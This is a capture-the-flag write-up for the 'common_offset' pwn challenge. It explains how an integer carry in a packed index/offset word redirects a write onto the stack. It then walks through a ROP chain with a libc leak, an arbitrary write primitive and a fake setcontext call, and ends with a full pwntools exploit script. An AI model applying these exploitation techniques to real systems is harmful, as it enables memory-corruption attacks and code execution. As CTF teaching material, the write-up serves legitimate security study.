# common_offset

> **CTF:** srdnlen CTF 2026 | **Category:** pwn / stack pivot / ret2libc / setcontext | **Difficulty:** Hard

---

## Challenge Overview

`common_offset` is a tiny 64-bit ELF with:

- No PIE
- No canary
- NX enabled
- Partial RELRO

The interface is deceptively simple:

1. Read a short lowercase/digit name
2. Allow exactly **2 writes**
3. Each write:
   - Choose an index
   - Increase a shared offset
   - Write a line into the chosen "file"

The challenge description talks about writing to multiple files with a shared offset. In reality, there are **no actual files** involved in the vulnerable logic. The "files" are just four fixed 0x20-byte buffers in `.bss`.

The vulnerability is not a plain buffer overflow on the normal path. The intended exploit comes from a **packed state bug**: the selected file index and the shared offset are stored in overlapping bytes of the same 16-bit stack word.

---

## Recon

### File Type / Protections

```bash
file common_offset
checksec --file=common_offset
```

```
ELF 64-bit LSB executable, x86-64
dynamically linked
not stripped
No PIE | No canary | NX enabled | Partial RELRO
```

### Relevant Sections

```bash
readelf -S common_offset | grep -E "Name|\.text|\.plt|\.got|\.data|\.bss"
```

| Section   | Address    |
|-----------|------------|
| `.text`   | `0x401110` |
| `.plt`    | `0x401020` |
| `.got`    | `0x403fd8` |
| `.got.plt`| `0x403fe8` |
| `.data`   | `0x404038` |
| `.bss`    | `0x404060` |

### Relevant Globals

From symbols / static analysis:

- `buffers` starts at `0x4040a0`
- `exit_flag` at `0x404120`

The four fake file-buffers are:

```
buffer0 = 0x4040a0
buffer1 = 0x4040c0
buffer2 = 0x4040e0
buffer3 = 0x404100
```

Each is `0x20` bytes long.

---

## Static Analysis

### `main()`

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[8];
  size_t i;

  *(_QWORD *)s = 0;
  printf("Put your name:\n> ");
  read_stdin(s, 8);

  for ( i = strspn(s, "0123456789abcdefghijklmnopqrstuvwxyz"); i <= 7; ++i )
    s[i] = 0;

  change_files(s);
  return 0;
}
```

- Reads at most 7 visible chars into `s[8]`
- Sanitizes so only lowercase letters and digits remain
- Passes `s` into `change_files()`
- No direct vulnerability here.

---

### `get_number()`

```c
__int64 get_number()
{
  _BYTE *v1;
  _BYTE v2[24];
  __int64 v3;

  read_stdin(v2, 16);
  v3 = __isoc23_strtoul(v2, &v1, 10);

  if ( v1 == v2 || (*v1 != 10 && *v1) )
    panic("Invalid number");

  return v3;
}
```

- Reads decimal input
- Rejects malformed strings
- Returns parsed number as an integer
- No memory corruption here.

---

### `write_chars()`

```c
__int64 __fastcall write_chars(__int64 a1)
{
  printf("Write on the file:\n> ");
  return read_stdin(
           *(_QWORD *)(a1 + 8LL * **(unsigned __int8 **)(a1 + 32)) + **(unsigned __int8 **)(a1 + 40),
           32 - **(unsigned __int8 **)(a1 + 40));
}
```

`a1` points to a 6-entry pointer table:

```
v4[0] = &buffer0
v4[1] = &buffer1
v4[2] = &buffer2
v4[3] = &buffer3
v4[4] = &index
v4[5] = &offset
```

So `write_chars()` effectively does:

```c
uint8_t index  = *(uint8_t *)v4[4];
uint8_t offset = *(uint8_t *)v4[5];

read_stdin(v4[index] + offset, 32 - offset);
```

On the normal path:
- destination = inside one of four 0x20-byte buffers
- length = exactly remaining capacity
- All writes are in-bounds.

---

### `change_files()` — The Vulnerable Function

```c
const char *__fastcall change_files(const char *a1)
{
  unsigned __int8 i;
  unsigned __int8 j;
  _QWORD v4[6];
  _WORD v5[8];

  for ( i = 0; i <= 3u; ++i )
    v4[i] = (char *)&buffers + 32 * i;

  v4[4] = (char *)v5 + 1;
  v4[5] = v5;
  v5[0] = 0;

  for ( j = 2; j; --j )
  {
    printf("You can still write on %hhu files!\n", j);
    printf("Choose the index:\n> ");
    HIBYTE(v5[0]) = get_number();
    if ( HIBYTE(v5[0]) > 3u )
      panic("Invalid index");

    printf("Increase the offset:\n> ");
    v5[0] += (unsigned __int8)get_number();
    if ( LOBYTE(v5[0]) > 0x1Fu )
      panic("Invalid offset");

    write_chars(v4);
  }

  if ( exit_flag )
    panic("This is a one-time function");

  exit_flag = 1;
  printf("Goodbye, %s!\n", a1);
  return a1;
}
```

#### Key Data Structure

`v5[0]` is the **vulnerable packed state**:

```
[rsp+0x48] = low byte  = offset
[rsp+0x49] = high byte = index
```

Index and offset are **not independent variables** — they overlap inside the same 16-bit word:

```c
struct {
    uint8_t offset;
    uint8_t index;
} state;
```

#### The Core Bug

The code validates `index`:

```c
HIBYTE(v5[0]) = get_number();
if (HIBYTE(v5[0]) > 3) panic("Invalid index");
```

Then updates the **whole 16-bit word**:

```c
v5[0] += (uint8_t)get_number();
if (LOBYTE(v5[0]) > 0x1f) panic("Invalid offset");
```

The bug:
1. `index` is checked **before** the add
2. The add is on the **whole 16-bit word**
3. The low-byte check happens **after** the add
4. **A carry from low byte can silently change the high byte**

A previously valid index can become invalid after validation.

---

## Dynamic Verification

### Verify Packed State Arithmetic

Break on the add/store in `change_files`:

```
b *0x40145c
r
```

Input: `aaaa` / index `3` / add `31`

```
ECX = 0x300  →  old packed state
EDX = 0x1f   →  increment
→  store writes 0x031f
   high byte = 0x03  (index  = 3)
   low byte  = 0x1f  (offset = 31)
```

This confirms the program performs full 16-bit arithmetic on the packed state.

### Verify Normal Write Destination

For normal input index=3, offset=31:

```
v4[3] = 0x404100
offset = 0x1f
final destination = 0x40411f  ← last byte of buffer3, not beyond
```

### Verify Table Layout on Stack

```
v4[0] = 0x4040a0
v4[1] = 0x4040c0
v4[2] = 0x4040e0
v4[3] = 0x404100
v4[4] = 0x7fffffffda19   → &index
v4[5] = 0x7fffffffda18   → &offset
```

```
0x...da18  packed state bytes (offset/index)
0x...da20  saved rbp-ish area
0x...da28  saved RIP
```

Distance from `&index` → saved RIP = `0x0f`

---

## Reachable Corruption Path

### Round 1

```
index = 0
add   = 1
→ 0x0000 + 0x0001 = 0x0001  (offset=1, index=0)
```

### Round 2

```
index = 3
add   = 255
→ 0x0301 + 0x00ff = 0x0400  (offset=0, index=4)
```

`0x00 <= 0x1f` passes the low-byte check. Validation is bypassed.

### Why index = 4 is Special

`write_chars()` does:

```c
base = v4[index];
dst  = base + offset;
```

With index=4:

```
base   = v4[4] = &index
offset = 0
dst    = &index
```

The second write now goes directly into the `change_files()` stack frame, giving a write window over: index, offset, saved frame data, and **saved RIP**.

---

## Exploit Strategy

### Stage 1 — Get RIP Control

Use the corrupted write (index=4) to overwrite saved RIP:

```python
STAGE1 = b"A" * 0x0F + p64(READ_STDIN) + p64(ADD28)
```

When `change_files()` returns:
1. Execution jumps to `read_stdin`
2. Attacker receives a larger controlled input
3. `add rsp, 0x28 ; ret` pivots the stack onto Stage 2

### Stage 2 — Leak libc and Build a Write Primitive

Relevant gadgets / symbols:

```python
ADD28                  = 0x40157B
POP_RAX                = 0x4014EC
MOV_RDI_RAX_ADD58_RET  = 0x4014E5
READ_STDIN             = elf.sym["read_stdin"]
GET_NUMBER             = elf.sym["get_number"]
PUTS_PLT               = elf.plt["puts"]
PUTS_GOT               = elf.got["puts"]
```

First ROP actions:

```
pop rax ; ret          → puts@got
mov rdi, rax ; add rsp, 0x58 ; ret
puts@plt               → leaks puts address
```

Then compute:

```python
base = leak_puts - libc.sym["puts"]
```

#### Mini Write-VM

Each iteration of the write loop:

1. Call `get_number` → attacker sends a decimal address → returned in `RAX`
2. `mov rdi, rax ; add rsp, 0x58 ; ret` → address into `RDI`
3. Call `read_stdin` → attacker sends 8 bytes → written at the chosen address

This writes arbitrary qwords into `.bss`.

### Writable Memory Layout

```python
CTX   = 0x404048   # fake ucontext
FP    = 0x404300   # file pointer storage
ROP   = 0x404500   # post-setcontext chain
STR   = 0x404900   # flag path string
BUF   = 0x404A80   # output buffer
DUMMY = 0x404FE0   # padding writes
```

All stable since binary is No PIE.

---

## setcontext Stage

### Fake Context Setup

```python
(CTX + 0x68, p64(STR)),         # RDI = path
(CTX + 0x70, p64(mode_addr)),   # RSI = "r"
(CTX + 0xA0, p64(ROP)),         # RSP = post-setcontext chain
(CTX + 0xA8, p64(fopen)),       # RIP = fopen
```

After `setcontext(CTX)`:

- First call is effectively `fopen(STR, "r")`
- Stack continues at `ROP`

### Final libc Chain

`fopen` returns `FILE *` in `RAX`. The final chain:

```
mov rdx, rax ; ret     → FILE* into RDX
pop rdi ; ret          → BUF
pop rsi ; ret          → 0x80
call fgets             → fgets(BUF, 0x80, fp)
pop rdi ; ret          → BUF
call puts              → puts(BUF)  → flag printed
```

---

## Gadget Version Mismatch

A practical wrinkle: libc patch drift between `ubuntu 2.42-0ubuntu3` and `2.42-0ubuntu3.1`.

Symbol offsets matched, but some raw gadget offsets differed. The exploit tries two candidate sets:

```python
GADGET_CANDIDATES = [
    {"pop_rdi": 0x11B93A, "pop_rsi": 0x5C247, "mov_rdx_rax": 0x145F17},
    {"pop_rdi": 0x11B8BA, "pop_rsi": 0x5C247, "mov_rdx_rax": 0x145ED7},
]
```

Remote solved with the **second set**.

---

## Full Attack Flow

| Step | Action |
|------|--------|
| 1 | Enter name |
| 2 | Round 1: index=0, add=1 |
| 3 | Round 2: index=3, add=255 → packed state becomes `0x0400` |
| 4 | `write_chars()` uses `v4[4] = &index` |
| 5 | Write 15 `A`s + `READ_STDIN` + `ADD28` over saved RIP |
| 6 | Feed Stage 2 ROP chain |
| 7 | Leak `puts@got`, compute libc base |
| 8 | Repeated `get_number` + `read_stdin` writes qwords into `.bss` |
| 9 | Jump to `setcontext` with fake context in `.bss` |
| 10 | `fopen("/challenge/flag.txt", "r")` |
| 11 | `fgets(BUF, 0x80, fp)` |
| 12 | `puts(BUF)` → flag printed |

---

## Full Exploit Script

```python
#!/usr/bin/env python3
from pwn import *
import re
import time

context.log_level = "error"
context.binary = elf = ELF("./common_offset_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

HOST = "common-offset.challs.srdnlen.it"
PORT = 1089

# Binary gadgets/functions
ADD28                  = 0x40157B
POP_RAX                = 0x4014EC
MOV_RDI_RAX_ADD58_RET  = 0x4014E5
DISPATCH_RDI404048_JMP_RAX = 0x401167
RET_MAIN               = 0x401140

READ_STDIN = elf.sym["read_stdin"]
GET_NUMBER = elf.sym["get_number"]
PUTS_PLT   = elf.plt["puts"]
PUTS_GOT   = elf.got["puts"]

# Writable addresses
CTX   = 0x404048
FP    = 0x404300
ROP   = 0x404500
STR   = 0x404900
BUF   = 0x404A80
DUMMY = 0x404FE0

STAGE1  = b"A" * 0x0F + p64(READ_STDIN) + p64(ADD28)
FLAG_RE = re.compile(br"srdnlen\{[^\n\r\x00]{1,200}\}")

GADGET_CANDIDATES = [
    {"pop_rdi": 0x11B93A, "pop_rsi": 0x5C247, "mov_rdx_rax": 0x145F17},
    {"pop_rdi": 0x11B8BA, "pop_rsi": 0x5C247, "mov_rdx_rax": 0x145ED7},
]

def build_stage2(m: int) -> bytes:
    size = 0x98 + m * 0x70 + 0x10
    d = bytearray(b"B" * size)

    d[0x20:0x28] = p64(POP_RAX)
    d[0x28:0x30] = p64(PUTS_GOT)
    d[0x30:0x38] = p64(MOV_RDI_RAX_ADD58_RET)
    d[0x90:0x98] = p64(PUTS_PLT)

    cur = 0x98
    for _ in range(m):
        d[cur:cur+8]       = p64(GET_NUMBER)
        d[cur+8:cur+0x10]  = p64(MOV_RDI_RAX_ADD58_RET)
        d[cur+0x68:cur+0x70] = p64(READ_STDIN)
        cur += 0x70

    d[cur:cur+8]   = p64(GET_NUMBER)
    d[cur+8:cur+0x10] = p64(DISPATCH_RDI404048_JMP_RAX)

    out = bytes(d)
    assert b"\x0a" not in out
    return out

def build_ops(base: int, gadgets: dict, path: bytes):
    setctx     = base + libc.sym["setcontext"]
    fopen      = base + libc.sym["fopen"]
    fgets      = base + libc.sym["fgets"]
    puts       = base + libc.sym["puts"]
    pop_rdi    = base + gadgets["pop_rdi"]
    pop_rsi    = base + gadgets["pop_rsi"]
    mov_rdx_rax = base + gadgets["mov_rdx_rax"]

    mode_addr = STR + len(path) + 1

    ops = [
        (CTX + 0x68, p64(STR)),
        (CTX + 0x70, p64(mode_addr)),
        (CTX + 0x88, p64(0)),
        (CTX + 0x98, p64(0)),
        (CTX + 0xA0, p64(ROP)),
        (CTX + 0xA8, p64(fopen)),
        (CTX + 0xE0, p64(FP)),
        (CTX + 0x1C0, p64(0x1F80)),

        (ROP + 0x00, p64(mov_rdx_rax)),
        (ROP + 0x08, p64(pop_rdi)),
        (ROP + 0x10, p64(BUF)),
        (ROP + 0x18, p64(pop_rsi)),
        (ROP + 0x20, p64(0x80)),
        (ROP + 0x28, p64(fgets)),
        (ROP + 0x30, p64(pop_rdi)),
        (ROP + 0x38, p64(BUF)),
        (ROP + 0x40, p64(puts)),
        (ROP + 0x48, p64(RET_MAIN)),
    ]

    s = path + b"\x00r\x00"
    s = s.ljust((len(s) + 7) // 8 * 8, b"\x00")
    for i in range(0, len(s), 8):
        ops.append((STR + i, s[i:i+8]))

    return ops, setctx

def run_once(stage2: bytes, m: int, gadgets: dict, path: bytes):
    io = None
    try:
        io = remote(HOST, PORT, timeout=8)

        io.recvuntil(b"> ", timeout=7)
        io.sendline(b"aaaaaa")
        for v in (b"0", b"1", b"X", b"3", b"255"):
            io.recvuntil(b"> ", timeout=7)
            io.sendline(v)

        io.recvuntil(b"> ", timeout=7)
        io.send(STAGE1)

        io.recvuntil(b"Goodbye, aaaaaa!\n", timeout=7)
        io.sendline(stage2)

        leak = io.recvuntil(b"\n", drop=True, timeout=7)
        if not leak or len(leak) > 8:
            return "noleak", b""

        leak_puts = u64(leak.ljust(8, b"\x00"))
        base = leak_puts - libc.sym["puts"]
        if base & 0xFFF:
            return "badbase", b""

        ops, setctx = build_ops(base, gadgets, path)
        if len(ops) > m:
            return "ops_big", b""

        while len(ops) < m:
            ops.append((DUMMY, b"Q" * 8))

        for _, blob in ops:
            if b"\x0a" in blob:
                return "blob_newline", b""

        for addr, data in ops:
            io.sendline(str(addr).encode())
            io.sendline(data)

        io.sendline(str(setctx).encode())
        time.sleep(0.9)
        out = io.recvrepeat(2.5)
        return "ok", out

    except EOFError:
        return "EOF", b""
    except Exception as e:
        return type(e).__name__, b""
    finally:
        try:
            if io:
                io.close()
        except Exception:
            pass

def main():
    m = 30
    stage2 = build_stage2(m)
    paths = [b"/challenge/flag.txt", b"/flag.txt", b"/flag"]

    for gidx, g in enumerate(GADGET_CANDIDATES):
        print(f"[+] trying gadget set {gidx}: {g}")
        for path in paths:
            print(f"[+] path {path!r}")
            for i in range(1, 31):
                st, out = run_once(stage2, m, g, path)
                s = out.replace(b"\x00", b"") if out else b""
                print(f"  [{i:02d}] {st} len={len(out)} sample={s[:80]!r}")

                mflag = FLAG_RE.search(s)
                if mflag:
                    print(f"\nFLAG: {mflag.group().decode()}")
                    return

                time.sleep(0.2)

    print("[-] flag not found")

if __name__ == "__main__":
    main()
```

---

## Flag

```
srdnlen{DL-r35m4LLv3}
```

---

## Key Lessons

**1. Packed state bugs are real bugs**
If two logical fields share a machine word, arithmetic on one can mutate the other.

**2. Validation order matters**
Here, `index` was checked before a later arithmetic operation silently changed it.

**3. Normal path being safe means nothing**
The intended exploit path did not use a normal in-bounds `.bss` write. It used corrupted table selection to redirect the write into the stack frame.

**4. Tiny control primitives can be bootstrapped**
The initial bug gave only a narrow stack overwrite. That was enough to bootstrap:
- another input read
- a stack pivot
- a libc leak
- an arbitrary qword writer
- a fake `setcontext` chain

**5. Patch-level libc drift can break raw gadget offsets**
Even when symbol offsets match, gadget offsets may differ across very close patch versions.
